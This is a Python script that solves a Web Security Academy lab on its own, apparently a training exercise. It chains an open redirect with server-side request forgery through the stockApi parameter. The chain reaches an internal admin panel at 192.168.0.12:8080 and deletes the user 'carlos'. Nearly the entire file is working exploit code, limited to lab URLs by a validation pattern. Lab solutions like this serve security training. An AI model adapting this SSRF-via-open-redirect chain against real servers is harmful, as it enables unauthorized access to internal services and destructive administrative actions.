import re
from typing import Callable
import requests
from rich.console import Console
from lxml import html
import urllib.parse
import typer
from valid8 import validate

console = Console()
app = typer.Typer()
open_redirect_link = ""


def pattern(regex: str) -> Callable[[str], bool]:
    r = re.compile(regex)

    def res(value):
        return bool(r.fullmatch(value))

    res.__name__ = f'pattern({regex})'
    return res


def fetch_product(server):
    response = requests.get(f"{server}/")
    html_document = html.fromstring(response.content)
    product = html_document.xpath("//section/div/a[contains(@href,'/product?productId=')]/@href")[0]
    console.log("Selecting product...")
    return product


def get_admin_page(product, server):
    response = requests.get(f"{server}{product}")
    console.log(f"Product page status code: {response.status_code}")
    html_document = html.fromstring(response.content)
    global open_redirect_link
    open_redirect_link = str(html_document.xpath("//div[@class='is-linkback']/a[contains(@href,'path=')]/@href")[0])
    link = re.sub(r'path=.*', 'path=http://192.168.0.12:8080/admin', open_redirect_link)
    admin_page = requests.post(f"{server}/product/stock", data={
        'stockApi': urllib.parse.quote(link)
    })
    console.log(f"Get Admin Page Status code: {admin_page.status_code}")
    return admin_page


def delete_user(admin_page, server):
    html_document = html.fromstring(admin_page.content)
    link = str(html_document.xpath("//div/a[contains(@href,'username=carlos')]/@href")[0])[1:]
    link = re.sub(r'path=.*', 'path=' + link, open_redirect_link)

    response = requests.post(f"{server}/product/stock", data={
        'stockApi': urllib.parse.quote(link)
    })
    console.log(f"Deleting user status code: {response.status_code}")


def check_lab_solver(server):
    response = requests.get(f"{server}/")
    html_document = html.fromstring(response.content)
    solved_link = html_document.xpath("//section[@id='notification-labsolved']")
    success_message = "Congratulations, you solved the lab!".center(100)
    error_message = "Not Solved!".center(100)

    if solved_link:
        console.print(success_message, style="blink bold white on green")
    else:
        console.print(error_message, style="blink bold white on red")


def is_lab_solved(server):
    response = requests.get(f"{server}/")
    html_document = html.fromstring(response.content)
    solved_link = html_document.xpath("//section[@id='notification-labsolved']")
    return True if solved_link else False


def validate_server(server):
    validate("server", server, length=65, custom=[pattern(r'\w{5}:\/\/\w{32}\.web-security-academy\.net$')],
             help_msg="Insert a valid URL from web security academy")

    if requests.get(f"{server}").status_code != 200:
        raise Exception("URL NOT VALID!")

    return server


@app.callback()
def main(
        server: str = typer.Option(
            ...,
            prompt=True,
            envvar="SERVER",
            help=f"Vulnerable server ID"
        )
):
    server = validate_server(server)
    if not is_lab_solved(server):
        with console.status("Fetching product..."):
            product = fetch_product(server)
        with console.status("Go to admin page"):
            admin_page = get_admin_page(product, server)
        with console.status("Deleting user Carlos..."):
            delete_user(admin_page, server)
        with console.status("Checking solving lab"):
            check_lab_solver(server)
    else:
        console.print("Challenge already solved!".center(100), style="blink bold black on yellow")


def run():
    try:
        typer.run(main)
    except Exception as e:
        console.print(f"[red bold]Error:[/red bold] {e}")


if __name__ == "__main__":
    run()
